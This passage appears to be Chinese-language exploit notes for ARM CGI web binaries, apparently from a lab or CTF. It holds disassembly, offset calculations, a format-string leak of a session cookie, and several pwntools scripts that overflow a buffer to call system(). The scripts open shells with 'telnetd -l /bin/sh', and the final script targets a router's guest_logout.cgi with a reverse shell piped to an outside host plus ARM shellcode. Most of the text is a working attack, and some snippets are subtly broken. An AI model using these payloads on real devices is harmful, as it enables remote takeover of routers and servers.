        return (char *)sub_109B0("20.21.2.26"); // system("/bin/ping -c 2 %s","20.21.2.26")
    }
  }
  return result;
}
假设输入
*#$^AAAAAAAAAA
-> v9 = 0x41
-> v8 = 0x41 + 2 * 0x41
n = 0x41+4* v8 // 确定整个包的长度，因此要尽量确保他比较大
v6 = 0x41
v5 = content[8] + 2 * v6 // payload的位置,要尽量精确
v3 = &[v5-77]
length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
payload ="*#$^(length_part1)(length_part2)(length_part3)(content_length_part1)(content_length_part2)('A'*(0x2fd - 77 - 5))+('B'*0x2f4 + payload)"
n = lenth_part3 + 4 * (length_part2 + 2 * length_part1) #3315
payload_length = content_length_part2 + 2 * content_length_part1 # 0x2fd
.text:
000109D4                 SUB     R3, R11, #-s
.text:
000109D8                 MOV     R0, R3          ; command
.text:
000109DC                 BL      system
.text:
00010B24                 LDR     R2, [R11,#n]    ; n
.text:
00010B28                 SUB     R3, R11, #-dest
.text:
00010B2C                 LDR     R1, [R11,#src]  ; src
.text:
00010B30                 MOV     R0, R3          ; dest
.text:
00010B34                 BL      strncpy
 MOV     R0, R3          ; dest
执行过后 R0中应该还是是第二段payload
因此我们返回到0x000109DC 直接Call system估计就行
#!/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *
import requests as rq

context.log_level="debug"

request_url = "http://127.0.0.1:80/55.cgi"

headers_for_get_uuid = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
  # 这里需要调试出偏移来泄漏uuid或者直接把uuid改了
    "Cookies":"%s%s%s" 
}

res = rq.post(request_url,headers = headers_for_get_uuid)

log.info("res: "+res)
# get_uuid

headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
  # 替换掉这里的uuid
    "Cookies":"uuid=aaaabbbbccccdddd"
}

commend = "& telnetd -l /bin/sh -p 6789 ;"

system = 0x000109DC

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust('B',0x2f4)
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))

rq.post(request_url,headers = headers ,data=payload)
假设我们栈情况：
  char s[20]; // [sp+0h] [bp-54h] BYREF //我们要泄漏的东西 长度为0x10
  char s2[20]; // [sp+14h] [bp-40h] BYREF
  char haystack[24]; // [sp+28h] [bp-2Ch] BYREF // uuid 12 =aaa 13 b%7$p 14
  char *format; // [sp+40h] [bp-14h] // format位置 现在测试出为第7个即：%7$p
  char *v5; // [sp+44h] [bp-10h] 
  char *v6; // [sp+48h] [bp-Ch]
  int v7; // [sp+4Ch] [bp-8h]

  我们先泄漏一下haystack来进行测试我们的计算：
  haystack = (0x2c - 0x14) / 4 = 6
  因此format 应该等于 7+6 = 13
export HTTP_COOKIES=uuid=%2$p // 注意转义$
export REQUEST_METHOD=POST
export CONTENT_TYPE=application/x-www-form-urlencoded
export CONTENT_LENGTH=10
export QUERY_STRING=name=F0und

qemu-arm -L /usr/arm-linux-gnueabi -g 1234 63.cgi
#!/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *
import requests as rq

context.log_level="debug"

def leak_session(format):
    request_url = "http://127.0.0.1:80/55.cgi"

    headers_for_get_uuid = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
    # 这里需要调试出偏移来泄漏uuid或者直接把uuid改了
        "Cookies": "uuid="+format 
    }

    res = rq.post(request_url,headers = headers_for_get_uuid)
    log.info("res: "+res.text)

for i in range(2,6):
  leak_session("%"+str(i)+"$p")
echo "name=F0und" | qemu-arm -L /usr/arm-linux-gnueabi 63.cgi
#!/usr/bin/env python
#-*-coding:
utf-8-*-
from pwn import *

commend = "& telnetd -l /bin/sh -p 6789 ;"

system = 0x000109DC

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust(0x2f4,"b")
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

with open("shellcode","w") as f:
    f.write(payload)
f.close()

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))
log.info("payload_length: "+str(len(payload))) #content_length 1452
# break point 0x00010C84 
# 0x00010B34
.text:
00010B90                 SUB     R3, R3, #4
.text:
00010B94                 LDR     R1, =aPing      ; "ping"
.text:
00010B98                 MOV     R0, R3          ; haystack
.text:
00010B9C                 BL      strstr
.text:
00010BA0                 MOV     R3, R0
.text:
00010BA4                 CMP     R3, #0
.text:
00010BA8                 BEQ     loc_10CCC
.text:
00010BAC                 LDR     R0, =a2021226   ; "20.21.2.26"
.text:
00010BB0                 BL      sub_109B0
.text:
00010BB4                 B       loc_10CCC
#!/usr/bin/env python
#-*-coding:
utf-8-*-
from pwn import *
    #remote
    #commend = "; telnetd -l /bin/sh -p 6789 ;"
commend = ";/bin/sh;"

system = 0x00010BB0

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5 - 4
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust(0x2f8,"b")
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

with open("shellcode","w") as f:
    f.write(payload)
f.close()

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))
log.info("payload_length: "+str(len(payload)))
#!/usr/bin/env python
#-*-coding:
utf-8-*-

from pwn import *
import requests as rq

context.log_level="debug"

def leak_session(format):
    request_url = "http://127.0.0.1:80/55.cgi"

    headers_for_get_uuid = {
        "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded",
    # 这里需要调试出偏移来泄漏uuid或者直接把uuid改了
        "Cookies": "uuid="+format 
    }

    res = rq.post(request_url,headers = headers_for_get_uuid)
    log.info("res: "+res.text)

#  leak session
for i in range(2,6):
  leak_session("%"+str(i)+"$p")

## get shell

headers = {
    "User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.51 Safari/537.36",
    "Content-Type":"application/x-www-form-urlencoded",
  # 替换掉这里的uuid
    "Cookies":"uuid=aaaabbbbccccdddd"
}

commend = ";/bin/sh;"

system = 0x00010BB0

length_part1 = p8(0xff)
length_part2 = p8(0xff)
length_part3 = p8(0xff)
content_length_part1 = p8(0xff)
content_length_part2 = p8(0xff)
offset = 0x2fd - 77 - 5 - 4
payload ="*#$^"+length_part1+length_part2+length_part3+content_length_part1+content_length_part2+ 'A'* offset
payload += commend.ljust(0x2f8,"b")
payload += p32(system)

n = ord(length_part3) + 4 * (ord(length_part2) + 2 * ord(length_part1)) #3315
payload_length = ord(content_length_part2) + 2 * ord(content_length_part1) # 0x2fd

log.info("package_length: "+hex(n))
log.info("strncpy_n_length: "+hex(payload_length))
log.info("payload_length: "+str(len(payload)))
rq.post(request_url,headers = headers ,data=payload)
#!/usr/bin/python

import requests
from pwn import *
context.log_level=logging.DEBUG
context(arch='arm',os='linux',endian='little')

url = "https://192.168.1.1/guest_logout.cgi"

# padding to 0xa9aed + 0x23 and then next instructon starts at 0xa9b10 
system_arg_addr = 0xa9b10
jmp_target = 0xa9ba8 

padding = b'x'*0x23

cmd = b"telnet 192.168.1.101 4444 | /bin | telnet 192.168.1.101 5555n"

payload = padding + cmd

payload = payload.ljust(cyclic_find("abma")+3*8+4,b'x')
# pop    {r4, r5, r6, r7, r8, sb, sl, fp, pc}
# payload += b'1234' * 8

payload += p32(0x35849144)
payload += p32(jmp_target) 

payload += b'x' * 5

'''
0x35849144
'''

shellcode= '''
mov r0,pc
sub r0,r0,#0xa0
push {r11}
pop {pc}
'''

shellcode = asm(shellcode)

payload += shellcode

payload = {
        "cmac":"12:af:aa:bb:cc:dd",
        "submit_button":b"status_captive.asp"+payload,
        "cip":"192.168.1.100"
        }
requests.post(url, data=payload, verify=False, timeout=1)
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]